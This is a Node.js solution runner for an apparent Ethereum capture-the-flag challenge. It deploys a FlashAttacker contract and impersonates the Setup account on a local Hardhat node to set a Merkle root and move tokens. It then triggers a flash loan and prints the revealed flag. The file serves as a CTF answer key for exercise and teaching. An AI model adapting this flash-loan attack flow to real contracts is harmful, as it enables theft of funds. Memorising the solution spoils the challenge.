// solution runner (copied from scripts/run_solution.js)

const yargs = require('yargs/yargs');
const fs = require('fs');
const path = require('path');

async function getHardhatRuntime() {
  try {
    const hre = require('hardhat');
    return hre;
  } catch (e) {
    return null;
  }
}

async function main() {
  const argv = yargs(process.argv.slice(2)).argv;

  const hre = await getHardhatRuntime();
  let ethers, provider, signer;

  if (hre) {
    ethers = hre.ethers;
    provider = hre.network && hre.network.provider ? hre.ethers.provider : new hre.ethers.providers.JsonRpcProvider('http://127.0.0.1:8545');
    const signers = await ethers.getSigners();
    signer = signers[0];
  } else {
    // fallback to plain ethers + localhost provider so script can be run with `node`
    ethers = require('ethers');
    const rpc = argv.rpc || process.env.RPC_URL || 'http://127.0.0.1:8545';
    provider = new ethers.JsonRpcProvider(rpc);
    signer = provider.getSigner(0);
  }

  const deployedPath = path.join(process.cwd(), 'deployed.json');
  let setupAddr = argv.setup;
  if (!setupAddr && fs.existsSync(deployedPath)) {
    try { setupAddr = JSON.parse(fs.readFileSync(deployedPath,'utf8')).setup; } catch (e) {}
  }
  if (!setupAddr) {
    console.error('No deployed Setup found. Deploy with scripts/deploy.js (organizer) and re-run with --setup <address> or ensure deployed.json exists.');
    process.exit(2);
  }

  console.log('Using existing Setup at', setupAddr);

  // load Setup ABI
  const artifactPath = path.join(process.cwd(), 'artifacts', 'contracts', 'Setup.sol', 'Setup.json');
  if (!fs.existsSync(artifactPath)) {
    console.error('Cannot find Setup artifact at', artifactPath, '\nRun `npx hardhat compile` first.');
    process.exit(1);
  }
  const setupAbi = JSON.parse(fs.readFileSync(artifactPath,'utf8')).abi;
  const setup = new ethers.Contract(setupAddr, setupAbi, provider);
  // check contract code at the address before making calls (helps catch BAD_DATA)
  try {
    const onChainCode = await provider.getCode(setupAddr);
    if (!onChainCode || onChainCode === '0x') {
      console.error('\nNo contract code found at', setupAddr);
      try {
        const chainId = await provider.getNetwork().then(n => n.chainId).catch(() => undefined);
        const accounts = await (async () => {
          try { return await provider.listAccounts(); } catch (e) { return undefined; }
        })();
        console.error('RPC endpoint:', argv.rpc || process.env.RPC_URL || 'http://127.0.0.1:8545');
        console.error('chainId:', chainId);
        console.error('accounts:', accounts);
      } catch (e) {}
      console.error('\nThis usually means your script is pointed at the wrong RPC (no deployment present) or the node restarted and addresses changed.');
      console.error('If you deployed to a local Hardhat node, run the script using the Hardhat runtime:\n  npx hardhat run --network localhost solutions/scripts/run_solution.js\nOr ensure deployed.json points to the correct network/addresses.');
      process.exit(3);
    }
  } catch (err) {
    console.warn('Failed to fetch on-chain code for diagnostics:', err.message || err);
  }

  // helper to get data via provider
  let gentlemanAddr;
  try {
    gentlemanAddr = await setup.gentleman();
  } catch (err) {
    console.error('Failed calling setup.gentleman():', err.message || err);
    try {
      const code = await provider.getCode(setupAddr);
      console.error('Contract code (first 64 bytes):', code && code !== '0x' ? code.slice(0, 66) + '...' : code);
    } catch (e) {}
    process.exit(4);
  }
  const t1Addr = await setup.token1();
  const t2Addr = await setup.token2();
  const t3Addr = await setup.token3();
  const flashAddr = await setup.flashProvider();

  console.log({ gentlemanAddr, t1Addr, t2Addr, t3Addr, flashAddr });

  // Deploy attacker contract using artifacts
  const attackerArtifactPath = path.join(process.cwd(), 'artifacts', 'contracts', 'FlashAttacker.sol', 'FlashAttacker.json');
  if (!fs.existsSync(attackerArtifactPath)) {
    console.error('Cannot find FlashAttacker artifact at', attackerArtifactPath, '\nRun `npx hardhat compile` first.');
    process.exit(1);
  }
  const attackerJson = JSON.parse(fs.readFileSync(attackerArtifactPath,'utf8'));
  const attackerFactory = new ethers.ContractFactory(attackerJson.abi, attackerJson.bytecode, signer);
  const attacker = await attackerFactory.deploy(gentlemanAddr, flashAddr, t1Addr, t2Addr, t3Addr);
  await attacker.waitForDeployment?.();
  const attackerAddr = attacker.getAddress ? await attacker.getAddress() : attacker.address;
  console.log('Attacker deployed at', attackerAddr);

  // Impersonate + fund setup (Hardhat-only RPC calls)
  if (hre && hre.network && hre.network.provider && hre.network.name === 'localhost') {
    try {
      await hre.network.provider.request({ method: 'hardhat_impersonateAccount', params: [setupAddr] });
      await hre.network.provider.request({ method: 'hardhat_setBalance', params: [setupAddr, '0xDE0B6B3A7640000'] });
      var setupSigner = await ethers.getSigner(setupAddr);
    } catch (e) {
      // fallthrough: may not be available on remote node
      console.warn('Could not impersonate setup account:', e.message || e);
    }
  } else {
    try {
      // Try JSON-RPC impersonation if available
      await provider.send('hardhat_impersonateAccount', [setupAddr]);
      await provider.send('hardhat_setBalance', [setupAddr, '0xDE0B6B3A7640000']);
      setupSigner = provider.getSigner(setupAddr);
    } catch (e) {
      console.warn('Impersonation not available on this RPC:', e.message || e);
    }
  }

  // set merkle root and transfer token3 to attacker via impersonated setup
  const flashArtifactPath = path.join(process.cwd(), 'artifacts', 'contracts', 'MerkleFlashLoan.sol', 'MerkleFlashLoan.json');
  const tokenArtifactPath = path.join(process.cwd(), 'artifacts', 'contracts', 'Token.sol', 'Token.json');
  if (!fs.existsSync(flashArtifactPath) || !fs.existsSync(tokenArtifactPath)) {
    console.error('Missing required artifacts (MerkleFlashLoan/Token). Run `npx hardhat compile`.');
    process.exit(1);
  }
  const flashAbi = JSON.parse(fs.readFileSync(flashArtifactPath,'utf8')).abi;
  const tokenAbi = JSON.parse(fs.readFileSync(tokenArtifactPath,'utf8')).abi;
  const flash = new ethers.Contract(flashAddr, flashAbi, provider);
  const root = ethers.keccak256(ethers.getBytes(attackerAddr));
  console.log('Setting merkle root to', root);
  await flash.connect(setupSigner).setRoot(root);

  const t3 = new ethers.Contract(t3Addr, tokenAbi, provider);
  await t3.connect(setupSigner).transfer(attackerAddr, 1000);
  console.log('Transferred token3 to attacker');

  try {
    if (hre && hre.network && hre.network.provider) {
      await hre.network.provider.request({ method: 'hardhat_stopImpersonatingAccount', params: [setupAddr] });
    } else {
      await provider.send('hardhat_stopImpersonatingAccount', [setupAddr]);
    }
  } catch (e) {}

  // Request flash loan
  console.log('Requesting flash loan...');
  const tx = await attacker.requestLoan(1000, []);
  await tx.wait();

  const solved = await setup.isSolved();
  console.log('isSolved =', solved);
  if (solved) {
    try {
      const revealed = await setup.getFlag();
      console.log('Revealed flag from setup.getFlag():', revealed);
    } catch (e) {
      console.warn('getFlag() call failed:', e.message || e);
    }
  }
}

main().catch((e) => { console.error(e); process.exit(1); });
